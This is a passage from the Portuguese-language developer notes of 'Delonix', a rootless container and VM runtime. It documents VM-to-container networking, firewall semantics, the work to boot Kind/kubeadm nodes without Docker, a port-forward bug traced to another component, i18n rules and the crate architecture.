  aos 3s para QUALQUER VM libvirt, mesmo nat a meio do boot).
- **`--ip <estático>`** (`vm create` + `spec.ip` no manifesto): reserva DHCP
  MAC→IP na rede libvirt (`virsh net-update … ip-dhcp-host`, `libvirt_reserve_ip`,
  idempotente add-last→modify). Só modo nat; noutros modos erro claro. Armadilha
  de argv: os flags `--live --config` têm de vir ANTES do `--` (depois viram
  dados posicionais). **Limitação**: `vm rm` ainda não remove a reserva.
- **`<backingStore>` explícito no XML do domínio**: o perfil AppArmor
  por-domínio (virt-aa-helper, Ubuntu) só whitelista caminhos presentes no XML
  — sem ele o QEMU abria o overlay mas levava EPERM no qcow2 base
  ("Could not open …vm-images/…: Permission denied"). Formato via
  `disk_backing_format` (nunca pela extensão).
- **DNS interno**: `dns_resolve` agora resolve VMs pelo **IP do registo**
  primeiro (uma VM nat/bridge vive na virbr0 do HOST — o MAC nunca aparece na
  neigh do holder, único mecanismo anterior), com neigh como fallback (CH).
  `delonix_vm::status` **persiste** o IP recém-aprendido (o lease DHCP chega
  muito depois do create). NOTA: o DNS corre no processo do holder — binário
  antigo só apanha isto num respawn do holder (não forçar num host com
  containers vivos).
- **Matriz de alcançabilidade validada ao vivo** (kaeso-sys-01, VM nat
  192.168.122.x + containers SDN 10.210.x): **container→VM funciona
  nativamente** (container → holder → slirp → stack do host → virbr0; provado
  com banner SSH recebido de dentro do kaeso-odoo) e as regras de EGRESS
  por-container governam-no (daddr CIDR). **VM→container**: por porta publicada
  ligada ao gateway da rede da VM, ou pelo proxy L7. IPs de container DIRECTOS
  são inalcançáveis de fora do netns do holder (NAT do slirp) — juntar as duas
  casas (virbr0 do host ↔ SDN no netns do holder) exige `CAP_NET_ADMIN` no
  init-netns do host (um veth+rotas privilegiado), fora do modelo rootless;
  trabalho futuro opt-in (`delonixd`), NÃO um toggle (o `delonix0` não é bridge
  de host — confirmado). VM↔VM na mesma rede nat: directo pela virbr0. IP do
  ingress (SDN) para VM = backend Cloud Hypervisor (tap no holder, MESMA SDN dos
  containers → alcança-os por IP directo; provado por construção, mas a golden
  image k8s só arranca em libvirt, não em CH).

### `delonix vm reach` — descoberta VM→container (sem dataplane novo)

O caminho VM→container por **porta publicada** só funciona se o bind for um
endereço que a VM roteia — o **gateway da rede libvirt** (ex.: `192.168.122.1`),
não o loopback (o default SEGURO, que faz o VM→container falhar em silêncio com
"connection refused"). O mecanismo já existia (`DELONIX_PUBLISH_ADDR=<gw>` no
`slirp_add_hostfwd`, IPv4 validado); ligar ao gateway do libvirt expõe às VMs
dessa rede **mas não à LAN externa** (192.168.122/24 é NAT). **Provado E2E**: de
dentro de uma VM (`ubuntu@192.168.122.50`), `curl 192.168.122.1:<porta>` →
HTTP 200 para um container na SDN; o loopback-bound recusa, como esperado.

`delonix vm reach` (`cmd/vm.rs`, `cmd_reach`) torna isto descobrível: lista os
gateways `virbr*` (`parse_ip_gateways`), lê o bind VIVO de cada porta publicada
via `ss -tlnH` (`parse_ss_binds` — o bind NÃO está no registo, veio do env var
no publish), e separa "alcançáveis a partir de VMs" (endereço:porta) dos
"loopback-only" (com o comando exacto de correção: `unpublish` + republish com
`DELONIX_PUBLISH_ADDR=<gw>`). Read-only, zero privilégio, zero mudança ao default
seguro. Parsers puros e testados (`parse_ip_gateways_pega_so_as_virbr`,
`parse_ss_binds_classifica_loopback_vs_gateway`).

## VM↔container por IP directo (`vm bridge`) — EXPERIMENTAL, privilegiado, opt-in

A ÚNICA coisa que o modelo rootless não faz sozinho: dar a uma VM libvirt (em
`virbr0`, netns do host) alcançabilidade DIRECTA aos IPs de container da SDN
(`delonix0`/`dlxn…`, dentro do netns do holder `unshare --user --net`). Fechar a
fronteira exige `CAP_NET_ADMIN` no init-netns do host, logo `vm bridge` **precisa
de root** — é a excepção deliberada ao daemonless-rootless, atrás de `--apply`
(default = DRY-RUN que só imprime o plano). Módulo `cmd/vmbridge.rs`.

- **Mecanismo** (`bridge_plan`, puro/testado): veth par no host → move a ponta SDN
  para o netns do holder + enslave à bridge da rede → ponta host ganha
  `<prefix>.255.254/16` → `ip_forward=1` → rota de retorno `<vm-subnet> via
  <host-ip>` DENTRO do holder. Sem SNAT: o container vê o IP real da VM, e o
  firewall por-container continua a governar (um IP de VM não está em `@dlxall`,
  passa como gateway; regras `ingress` explícitas aplicam-se na mesma).
- **Segurança**: abre VM↔container só na rede indicada; a subnet da VM é a NAT do
  libvirt (`192.168.122.0/24`), NÃO a LAN externa. `vm unbridge <rede>` desfaz.
- **Robustez**: regras `iptables -I FORWARD` ACCEPT nos dois sentidos
  (`<vm-subnet>↔<sdn>/16`) contra o REJECT default do libvirt; establish
  IDEMPOTENTE (limpa um veth órfão antes de criar, p.ex. após respawn do holder).
- **VALIDADO E2E ao vivo** (kaeso-sys-01, 2026-07-21): de DENTRO de uma VM libvirt
  (`ubuntu@192.168.122.50`) → `ping`/`curl` a um container da `kaeso-net` por IP
  DIRECTO (`10.210.37.150:8069` → HTTP 200, ttl=63 = uma hop pelo forward do
  host). O `unbridge` limpa tudo. Três bugs reais apanhados no host e corrigidos:
  (1) sob sudo resolvia o state do root, não do utilizador (`adopt_invoking_user_root`
  via `$SUDO_USER`); (2) `nsenter -U -n` largava as caps → EPERM no enslave, tem
  de ser `-n` só (root mantém o CAP_NET_ADMIN do init-userns sobre o netns do
  userns descendente); (3) IPs de container são dinâmicos (DHCP, mudam no restart).
- **Follow-ups**: persistência (re-aplicar num respawn do holder) e **descoberta
  por NOME** (a VM resolver `<c>.<ns>.delonix.internal` via o DNS do holder, para
  não depender de IPs dinâmicos) — a fatia que dá o valor real. Complementa o
  `vm reach` (via porta publicada, sem privilégio) para quem precisa do IP 10.x cru.

## Firewall `ingress`/`egress` — o último comando ganha (+ `rm` cirúrgico)

Bug report real: `ingress deny <c> 8069` seguido de `ingress allow <c> 8069`
deixava o serviço bloqueado PARA SEMPRE — as regras acumulavam no `ContainerFw`
e a chain nft é first-match terminal, logo o deny antigo (acima) ganhava. Fixado
em `cmd/firewall.rs::add_rule` (semântica ufw): uma regra nova para o MESMO
match (dir/proto/porta/origem, com `""`≡`0.0.0.0/0`≡`*` via `norm_any`)
**substitui** a existente, com nota no output. Para sobreposições parciais (ex.:
`deny any/8069` vs `allow tcp/8069`, matches distintos) um **aviso de sombra**
(`field_overlaps`) explica que a regra anterior continua a casar primeiro e diz
o comando para a tirar. Novo **`ingress|egress rm <c> <[proto/]porta> [--from/
--to]`** — remoção cirúrgica em que os coringas do spec são FILTRO (`rm c 8069`
tira tcp/udp/any dessa porta); complementa o `clear` (tudo-ou-nada) e segue a
sua regra de "firewall vazia desaparece por inteiro". Também corrigido:
`ingress unpublish` num container PARADO sem rede custom — o hostfwd vive no
slirp por-container, que morreu com ele; limpa-se só o registo (antes: erro
"container is not running" e o publish ficava preso). Validado E2E ao vivo
(deny→000, allow→200 com substituição, rm→limpo). Nota: um `ingress -h` vazio
reportado uma vez NÃO reproduziu (3× OK) — glitch de terminal, sem causa no CLI.

## Cluster modo Kind sem Docker — investigação (GO/NO-GO)

Pedido: `delonix cluster` em modo `kind` (sem `kubeadm`) a funcionar **sem Docker instalado** —
`delonix` substituiria Docker/Podman como backend do `kind`. Antes de investir no shim de
compatibilidade Docker (grande — emulação de templates Go, `network create`, `run` com
`--publish`/`--tmpfs`/`--restart`/`--cgroupns`, `logs -f`), fez-se: (1) investigação empírica da
superfície real que o `kind` exige de um backend, (2) 2 bugs corrigidos em `delonix image pull`
que bloqueavam qualquer teste, (3) um spike de validação — a imagem `kindest/node` (systemd +
containerd aninhado) sequer arranca sob o nosso modelo de isolamento?

### Superfície capturada (referência para a fase do shim)

Investigação empírica (não suposição): `docker` real envolvido num wrapper que regista cada
invocação, com um `kind create cluster` real de ponta a ponta — **52 invocações capturadas**.
Comandos usados por um backend "docker": `info --format {{json .}}` (+ variantes `-f {{.Driver}}`,
`--format '{{json .SecurityOptions}}'`, `-f {{json .DriverStatus }}`), `ps -a --filter
label=io.x-k8s.kind.cluster=<n> --format {{.Names}}`, `inspect --type=image <ref>`, `pull <ref>`,
`network ls --filter=name=^kind$ --format={{.ID}}`, `network inspect bridge -f {{ index .Options
"com.docker.network.driver.mtu" }}`, `network create -d=bridge -o
com.docker.network.bridge.enable_ip_masquerade=true -o com.docker.network.driver.mtu=1500 --ipv6
--subnet <cidr> kind`, `run --name <n> --hostname <n> --label io.x-k8s.kind.role=... --privileged
--security-opt seccomp=unconfined --security-opt apparmor=unconfined --tmpfs /tmp --tmpfs /run
--volume /var --volume /lib/modules:/lib/modules:ro -e KIND_EXPERIMENTAL_CONTAINERD_SNAPSHOTTER
--detach --tty --label io.x-k8s.kind.cluster=<n> --net kind --restart=on-failure:1 --init=false
--cgroupns=private --publish=127.0.0.1:<porta>:6443/TCP -e KUBECONFIG=... <imagem>`, `logs -f
<n>`, `inspect --format {{ index .Config.Labels "io.x-k8s.kind.role"}} <n>`, `exec --privileged
[-i] <n> <cmd>` (repetido para `cat`/`mkdir`/`cp /dev/stdin`/`kubeadm init`/`kubectl ...`),
`inspect -f {{range .NetworkSettings.Networks}}{{.IPAddress}},{{.GlobalIPv6Address}}{{end}} <n>`,
`inspect --format {{ with (index (index .NetworkSettings.Ports "6443/tcp") 0) }}{{ printf "%s\t%s"
.HostIp .HostPort }}{{ end }} <n>`, `rm -f -v <n>`.

Templates Go usados pelo `kind` são um conjunto **finito e conhecido** (capturado acima) — a fase
do shim pode emular por **correspondência exacta das strings**, sem motor de templates Go em Rust.

### 2 bugs corrigidos em `delonix image pull` (`crates/delonix-image/src/registry.rs`)

1. **`parse_reference` não tratava `repo:tag@digest`** (formato combinado, usado pela própria
   referência `kindest/node:v1.34.0@sha256:...`) — o ramo `@` cortava a referência sem primeiro
   remover a tag do lado do `repo`, produzindo uma URL de manifesto malformada. Testes de
   regressão: `parses_repo_tag_and_digest_combined`, `parses_repo_tag_and_digest_combined_com_registo_explicito`.
2. **Timeout de 120s demasiado curto** em `registry_client`/`pull_from_registry_with_creds` —
   `kindest/node` tem layers de várias centenas de MB; o `reqwest` cortava a leitura do corpo a
   meio, reportado como `"error decoding response body"` (não é erro de parsing, é leitura
   interrompida). Subido para 600s, alinhado com `push_to_registry`/`push_oci_artifact`.

Confirmado com um smoke test real: `delonix image pull kindest/node:v1.34.0@sha256:...` completa
em ~2min (antes falhava sempre, nos dois bugs).

### Spike GO/NO-GO: `container run --privileged` — resultado: **NO-GO nesta v1**

Achado inesperado antes mesmo do spike: o motor **já tem** lógica dedicada de delegação de
cgroup2 para nodes Kind (`setup_node_cgroup_ns` em `crates/delonix-runtime/src/lib.rs`), activada
quando `--privileged` + uma label `io.x-k8s.kind.*` está presente — trabalho não documentado
antes desta sessão. Para a poder exercitar, adicionou-se uma flag `--label KEY=VAL` (repetível) a
`delonix container run` (`crates/delonix-runtime-bin/src/cmd/container.rs`) — não existia
nenhuma forma de definir labels via CLI, só internamente. Ficou como funcionalidade permanente
(expõe um campo já existente em `Container`, não é específico de Kind).

Com a label e `--privileged`, `kindest/node` **crasha sempre no mesmo ponto**, muito cedo — logo
a seguir a `INFO: detected cgroup v1` no log do próprio entrypoint da imagem (que corre num host
100% cgroup v2, confirmado via `stat -fc %T /sys/fs/cgroup` → `cgroup2fs`). O crash reproduz-se
de forma idêntica em 3 condições diferentes:

1. `--privileged` sem a label Kind (cai no caminho `--privileged` genérico).
2. `--privileged` + label Kind, sessão rootless sem delegação systemd (motor avisa: "rootless SEM
   delegação de cgroup").
3. O mesmo, mas envolto em `systemd-run --user --scope -p Delegate=yes` (delegação pedida
   explicitamente) — **não muda o resultado**.
4. Mesmo com `command` sobreposto para `sleep infinity` — não isola nada, porque `--entrypoint`
   não existe no CLI hoje: `compose_command` mantém sempre o `ENTRYPOINT` da imagem
   (`/usr/local/bin/entrypoint /sbin/init`) e só a cauda muda, então o script do `kind` corre de
   qualquer forma.

**Causa-raiz não isolada com 100% de confiança** (precisa da próxima sessão): o log mostra
"detected cgroup v1" — misdetecção, já que o host é v2-only — e o script morre logo a seguir,
silenciosamente (sem stack trace; o `Container` também não guarda exit code hoje, gap a
corrigir). Hipótese mais provável: `/sys/fs/cgroup/cgroup.controllers` não está visível/válido
de dentro do mount+userns do nosso container no momento em que o script de deteção do `kind`
corre, levando-o a um caminho de cgroup v1 legado que depois falha contra um kernel só-v2. Para
confirmar: precisa de um `--entrypoint` override no CLI para correr o entrypoint do
`kindest/node` manualmente com `set -x`, ou copiar/editar o script para instrumentação.
**Actualização (sessão -p/paridade)**: `--entrypoint` JÁ EXISTE no CLI (`cmd_run`, semântica
docker, `""` limpa), e a causa-raiz provável foi corrigida no motor (fallback bind do /sys do
host quando montar sysfs novo dá EPERM em `--privileged --net host`, + mountpoint do cgroup2
criado pós-pivot_root — ver commit `dfe7e0b`). Revalidação do boot do `kindest/node` pendente.

**RESOLVIDO — a deteção de cgroup já não é o bloqueio** (sessão -p/paridade, confirmado com
instrumentação real via `--entrypoint /bin/bash` + `set -x`). Com o fix do sysfs (`dfe7e0b`),
dentro do container `--privileged` o `/sys/fs/cgroup` é `cgroup2fs` com TODOS os controladores
(`cpuset cpu io memory hugetlb pids rdma misc dmem`, 41 entradas) — antes estava vazio. O
entrypoint do `kindest/node`, corrido sob `systemd-run --user --scope -p Delegate=yes`, imprime
agora **`INFO: detected cgroup v2`** (era "detected cgroup v1" + morte) e avança muito mais:
userns ✓, mounts shared ✓, cgroup v2 ✓, machine-id ✓, faking DMI "kind" ✓, iptables legacy.
Também se descobriu, pelo caminho, um **deadlock corrigido**: em modo console (`privileged +
detach + log_path`), se o init morre antes de enviar o master do pty e um neto reparentado
segura o socketpair, o `run` pendurava PARA SEMPRE sem log — `recv_fd` ganhou `SO_RCVTIMEO` 10s.

**RESOLVIDO — netfilter já não é o bloqueio** (loop /loop netfilter). Causa isolada: com um netns
PRÓPRIO (owned pelo userns do container, i.e. `CLONE_NEWNET` e NÃO `--net host`), `CAP_NET_ADMIN`
é efectivo e o backend **nft funciona** (`nft add table`, `iptables-nft -L/-A` todos OK). O
backend **legacy NÃO**: lê `/proc/net/ip_tables_names`, um ficheiro `0440` do root do HOST que no
nosso userns aparece com dono não-mapeado (nobody) → EPERM (o próprio host, como não-root, também
não o lê). O `select_iptables()` do entrypoint do Kind conta linhas de `iptables-legacy-save` vs
`iptables-nft-save`; num netns fresco ambos dão 0 e o empate (`legacy >= nft`) cai para legacy —
o caminho partido. **Fix (`seed_kind_nft` em `container_init`, análogo a `mask_slow_node_units`)**:
para um nó Kind (`node_cgroup`), semeia UMA regra `iptables-nft -A INPUT -j ACCEPT` (inócua, ANTES
do `execve`, ainda com CAP_NET_ADMIN) → `iptables-nft-save` reporta ≥1 linha → o Kind escolhe nft.

**ESTADO ACTUAL — o `kindest/node` ARRANCA** (`run --privileged --detach --net none` sob
`systemd-run --user --scope -p Delegate=yes`, com os dois fixes: sysfs `dfe7e0b` + `seed_kind_nft`):
`detected cgroup v2` → `setting iptables to detected mode: nft` → `starting init` → `systemd 252
running in system mode` → `Welcome to Debian GNU/Linux 12` → dezenas de `Reached target`/`Started`
→ cria a `kubelet.slice`. Container fica **Running**. O NO-GO original (systemd+cgroup do node não
arranca) está **fechado**.

**Conectividade LIGADA + netfilter validado end-to-end** (loop netfilter, 2ª iteração). Com
`--net host -p 6443:6443` (netns próprio + slirp4netns — ver `cmd_run`, `new_netns` +
`slirp_attach`) o nó Kind arranca COM rede: `tap0` `10.0.2.100/24`, resolve `registry.k8s.io`
(outbound OK), `detected cgroup v2` → `iptables mode: nft` → systemd (0 unidades falhadas) →
**containerd `active`** (socket `/run/containerd/containerd.sock`). **`kubeadm init phase preflight`
PASSA** (RC=0) sem UM ERRO de netfilter/iptables — avança até ao pull de imagens. Warnings só de:
swap, cgroup `cpuset missing` (lacuna de delegação, ver abaixo), hostname `debuerreotype`. Os
sysctls de bridge estão activos no nó (`bridge-nf-call-iptables=1`, `ip_forward=1`). **Netfilter
está resolvido de ponta a ponta** para a carga real de k8s.

**Bug corrigido pelo caminho — `exec` largava caps em containers `--privileged`**: `runtime::exec`
usava `resolve_cap_keep` incondicionalmente (default KEPT_CAPS, sem CAP_NET_ADMIN), ignorando
`container.privileged` — ao contrário do init (`spawn`, `if privileged { all_caps_mask() }`).
Depurar netfilter por dentro (`nft`/`iptables` via `delonix container exec`) dava "Operation not
permitted" apesar de o init ter as caps. Corrigido: `exec` espelha o init (caps completas + seccomp
unconfined quando privileged). Confirmado: exec CapEff `1ffffffffff`, `nft` via exec OK.

### CLUSTER KUBERNETES REAL A CORRER — `kubeadm init` COMPLETO (2026-07-17)

Um control-plane Kubernetes v1.34 **Ready** sobre o Delonix, rootless, daemonless, **sem Docker**:

```
NAME   STATUS   ROLES           AGE   VERSION            CONTAINER-RUNTIME
kadm   Ready    control-plane   8m    v1.34.0            containerd://2.1.3
etcd / kube-apiserver / kube-controller-manager / kube-scheduler / kube-proxy / kindnet  →  todos 1/1 Running
```

Provas que interessam: o **kube-proxy programa netfilter** no nosso netns rootless (`nft list tables`
→ `table ip filter`, `table ip mangle`, `table ip nat`) e o nó regista-se com `INTERNAL-IP 10.0.2.100`.

**A receita que um nó Kind rootless EXIGE** (o `delonix cluster` tem de a gerar; nada disto é bug do
runtime — é config de kubelet/kube-proxy, e é exactamente o que o `kind` rootless também faz):
1. **`featureGates: { KubeletInUserNamespace: true }`** no `/var/lib/kubelet/config.yaml`. É O passo
   decisivo. Sem ele o kubelet morre em `open /dev/kmsg` — e o próprio kubelet diz a solução no log
   ("running in UserNS, Hint: enable KubeletInUserNamespace feature flag"). Tentar dar-lhe um
   `/dev/kmsg` NÃO resolve: um bind do kmsg do host é `root:adm 0640` (uid mapeado não abre) e um
   symlink para `/dev/console` só troca ENOENT por EIO. Com a gate, o kubelet ignora o kmsg.
2. **`--fail-swap-on=false`** no kubelet: um container herda o `/proc/swaps` do HOST — o fix de swap
   da imagem VM dourada (fstab) não se aplica aqui.
3. **`conntrack: { maxPerCore: 0, min: 0 }`** no ConfigMap do kube-proxy: `nf_conntrack_max` é um
   sysctl global, não escrevível de um userns (`permission denied` → CrashLoopBackOff).
4. CNI: o `/kind/manifests/default-cni.yaml` da imagem (kindnet) aplica-se tal e qual (só substituir
   `{{ .PodSubnet }}`); o nó passa a `Ready` ~1min depois.

**Aprendido pelo caminho (leaks de recursos — ver "Produção/HA")**: o kubelet aplicou a taint
`node.kubernetes.io/disk-pressure` porque **49 rootfs órfãos** (~45 GiB) de spikes anteriores tinham
enchido o disco a 89%. Directórios de container sobrevivem a mortes abruptas sem ninguém os reapar.

**Próximas fatias (já não netfilter)**: (1) cgroup `cpuset` na delegação (preflight marca-o
"missing required" — só WARNING, mas fecha-o para um nó limpo); (2) correr `kubeadm init` completo
até um control-plane Ready (o preflight já passa; falta exercitar o pull+init+CNI reais); (3)
`--net kind` rootless (setns) para nós na MESMA rede em vez de slirp isolado por nó. O shim Docker
continua depois destes, mas a fundação — cgroup + netfilter + systemd + containerd + rede — arranca.


### RESOLVIDO — as portas publicadas morriam sozinhas: era o `delonix-engine`, não o runtime (2026-07-17)

**Fechado.** Este bug queimou várias sessões porque o diagnóstico registado aqui estava ERRADO em
ambas as premissas: dizia que "as duas metades do `publish_port` falham em SILÊNCIO" e mandava
procurar quem chamava `unpublish_port`. Não falham, e não há chamador nenhum.

**Sintoma**: porta publicada serve HTTP 200 e ~10–16s depois dá `000`, com o container `Running` e
sem `stop`/`rm`.

**O que se provou, por medição** (não por leitura de código):
1. O **DNAT fica intacto** (`nft list table ip dlxing` mostra a regra muito depois do `curl` já dar
   `000`). Só o `hostfwd` do slirp desaparece — não são "as duas metades".
2. **Nenhum código deste repo o remove**: instrumentados `unpublish_port`, `slirp_remove_hostfwd`,
   **todos** os comandos não-`list` do `slirp_api` (apanha o `remove_hostfwd` que o
   `reap_orphan_hostfwds` envia directamente) e o `control_send`. Zero ocorrências, sempre.
3. Slirp e holder **não reiniciam** (mesmo pid); o `control_loop` do holder não tem nada periódico.
4. Um hostfwd metido **à mão** pelo api-socket, sem delonix envolvido, **também** desaparece.
5. **Não é bug do slirp4netns**: um slirp de sala limpa, mesmas flags, alvo `unshare -r -n`,
   manteve o hostfwd os 33s todos.

**Causa-raiz, provada com SIGSTOP** (congelar os engines, sem matar nada):
```
engines A CORRER   → hostfwd criado a t=0,00s · DESAPARECE a t=12,01s
engines CONGELADOS → hostfwd criado a t=0,00s · PERSISTE os 30s todos
```
É o **`delonix-engine` (delonix-paas, produto PRIVADO)** a reapar portas que não são dele:
`crates/delonix-api/src/ui.rs:12937` chama `reap_orphan_hostfwds(&live)` com um `live` que só tem os
containers DELE — logo tudo o que a CLI do runtime publica é, para ele, um órfão. Agravante:
`crates/delonix-api/Cargo.toml:15` fixa `delonix-net` na **tag v0.1.0**, a versão ANTIGA do reaper
(a do fail-open: lista vazia ⇒ "nada em uso" ⇒ apaga tudo). Por isso é que remover o chamador AQUI
(`9bbbd11`) não mudou nada: a cópia que corre é a do PaaS.

**A correcção NÃO é neste repo** (regra de isolamento) — é no `delonix-paas`: o engine não pode
reapar hostfwds que não criou, e o pin de `delonix-net` tem de subir. Do lado de cá, o que faz
sentido é defesa em profundidade: **`reap_orphan_hostfwds` é código morto (zero chamadores) e é uma
armadilha para consumidores** — uma função pública que apaga estado partilhado e falha ABERTO com
lista vazia. Apagar, ou pôr a fail-closed.

**Ferramenta que ficou**: `DELONIX_TRACE_UNPUBLISH=<ficheiro|stderr>` regista quem despublica
(função, porta, pid/ppid/exe + backtrace), no `slirp_api`/`control_send`/`unpublish_port`. Custo
zero sem a env var. Foi o que permitiu ILIBAR este repo — sem isto voltava-se a suspeitar do código
errado.

**Continua em aberto**: o `refcount` do ingress vaza (16 com 3 containers vivos).

Ver [docs/RELATORIO-PRE-PRODUCAO.md](docs/RELATORIO-PRE-PRODUCAO.md) para a bateria E2E completa
(139 PASS / 1 FAIL) e a lista de gaps.

## Próximas fases (pedidas, não implementadas — cada uma precisa da sua própria sessão de planeamento)

- **`delonix cluster --name <n> --control-plane <n> --workers <n>`** (sem `kubeadm`) — cluster k8s
  local via `kind` (shell-out à ferramenta já instalada no host). **Bloqueado** pelo NO-GO do
  spike acima — o `kindest/node` não arranca sob o nosso `--privileged` hoje; ver secção "Cluster
  modo Kind sem Docker — investigação". Precisa de instrumentação de arranque antes de continuar.
- **`etcd: external`** em `delonix cluster apply` + `--etcd-cluster <N>` em `delonix cluster
  kubeadm` — cluster etcd dedicado (TLS entre membros, discovery) isolado dos control-planes, em
  vez do `stacked` já suportado. Desenho já esboçado (PKI própria via `rcgen` — CA+certos, sem
  precedente no código, que hoje só gera um leaf self-signed para o `httproute`; `kubeadm init`
  muda de flags simples para `--config` YAML, obrigatório para etcd externo) — maior risco que o
  LB automático acima, fica para uma sessão de planeamento própria.
- **Paralelizar a preparação de host** em `cluster apply` (hoje sequencial, deliberado nesta v1).
- **`delonixd`** (daemon opcional em userspace) + **dataplane de ingress/egress próprio** (evitar
  um veth por container — hoje `infra::do_attach` cria sempre 1 veth-par por container,
  confirmado) + **firewall dinâmico** para publish de portas + **eBPF** para observabilidade +
  **auto-dimensionamento** no pico. Nenhuma peça disto existe hoje (zero eBPF/autoscaling/daemon
  no repo, confirmado por grep). É uma mudança de filosofia (o produto é daemonless por desenho)
  e um dataplane novo de raiz — meses de trabalho de um crate dedicado, não uma sessão.

## i18n (fonte EN + catálogo pt.po embutido) — `cmd/po.rs`

Desde a v0.5.0, **a fonte de strings de utilizador é 100% EN** e as traduções vivem
num catálogo gettext embutido (`crates/delonix-runtime-bin/data/pt.po`, 171 msgids),
activado por `--l18n=pt`/`DELONIX_L18N=pt`. Regras para não regredir:

- **String nova de UI = EN no código + entrada no `pt.po`.** Nunca voltar aos pares
  inline `tr(en, pt)` (morreram na fase 3a) nem a `if is_pt()` manuais.
- `po::t(&'static str)` para strings fixas; `po::tf(template, &[(nome, valor)])` para
  interpoladas — o `format!` exige literais, logo traduz-se o TEMPLATE com
  placeholders NOMEADOS (`{port}`) e substitui-se depois (nomeados de propósito:
  uma tradução pode reordená-los).
- **O help do clap traduz-se em runtime**: a língua decide-se com `po::peek_lang()`
  ANTES do parse (o help gera-se durante), e `po::translate_help` reescreve
  about/help do `Command` inteiro. Armadilha conhecida: o derive REMOVE o ponto
  final do help curto — `t_help` compensa (lookup com e sem `.`).
- Parser `.po` próprio (~50 linhas, testado) — sem crate `gettext` (regra de
  supply-chain). `parse_po` cobre msgid/msgstr multi-linha + escapes.
- **Comentários do código: 100% EN (FEITO).** Todos os comentários (`//`, `///`,
  `//!`) dos 9 crates de motor (PR #26) e do `delonix-runtime-bin` (PR #27) foram
  traduzidos PT→EN; o help de CLI que ainda vivia em PT no código (doc-comments
  `///` dos enums clap + campos `#[arg]`) passou a EN na fonte, com o PT no
  `pt.po` (+183 entradas na fase 2). Regra a manter: comentário/help novo = EN no
  código; a tradução vai para o `pt.po` (o `t()`/`translate_help` degradam para EN
  se faltar a entrada, nunca deixam a UI muda). Só identificadores/nomes de teste
  em PT sobrevivem (não são texto de utilizador).
- **Pendente**: mensagens de erro dos crates de MOTOR (não podem depender do bin;
  a via desenhada é traduzir no printer de erros do `main.rs` por lookup do texto
  EN) — os textos EN dessas mensagens ainda não estão semeados no `pt.po`.

## Regra de ouro: fronteira com o PaaS

Este código **não pode depender de nada privado**. Antes de qualquer commit:

1. **Nunca** adicionar uma dependência a `delonix-core`, `delonix-api`, `delonix-orchestrator`,
   ou qualquer outro crate do monorepo `delonix-paas` — este repo tem de compilar sozinho,
   sem acesso a nada privado. `cargo tree -e normal` não deve mostrar nenhum crate `delonix-*`
   que não esteja listado no `Cargo.toml` raiz.
2. **Sem noção de tenant/licença/billing/Console.** Se uma mudança precisar de saber "quem é
   o cliente" ou "que plano tem", essa lógica pertence ao `delonix-paas`, não aqui.
3. **`Secret`/`SecretStore`/`CredVault`** (`delonix-runtime-core::secret`/`cred_vault`) são o
   Secret Manager do runtime (`--secret`/`--secret-files`, Docker-style) — não confundir com
   nenhum cofre de credenciais de plataforma/SSO/DNS que o PaaS privado tenha por cima.
4. **`delonix-net` inclui WireGuard** (`wg.rs`) — cifra o transporte VXLAN entre nós, é SDN
   genuína (fica aqui). O broker de control-plane que decide QUANDO publicar portas
   (`Router`, multi-tenant) ficou no lado privado (`delonix-overlay`, em `delonix-paas`).

## Arquitetura (8 crates)

| Crate | Responsabilidade |
|---|---|
| `delonix-runtime-core` | tipos partilhados: `Container`, `Vm`, `Status` (6 estados), `Store`/`JsonStore`, typestate, deteção de virtualização, Secret Manager |
| `delonix-runtime` / `delonix-runtime-bin` | runtime de containers (clone/namespaces/cgroups, create/stop/exec, reconcile_status) + a CLI `delonix` completa (container/image/build/vm/volumes/network — ver secção "CLI" acima) |
| `delonix-net` | SDN rootless: holder netns + bridge + slirp único, DNAT/firewall nft, compat CNI, overlay WireGuard inter-nó |
| `delonix-image` | imagens OCI: pull/registry/build, buildpacks CNB, registo interno, verificação de assinatura |
| `delonix-vm` | microVMs declarativas — trait `VmBackend` (Cloud Hypervisor ou libvirt) |
| `delonix-volume` | volumes nomeados e bind mounts |
| `delonix-cri` | servidor CRI (`runtime.v1`) — permite ao Delonix servir de runtime a um `kubelet` |

## Histórico

Extraído de `delonix-paas` via `git filter-repo` (histórico real preservado, não squash) —
ver a skill `delonix-paas` no control dir para o produto de origem.
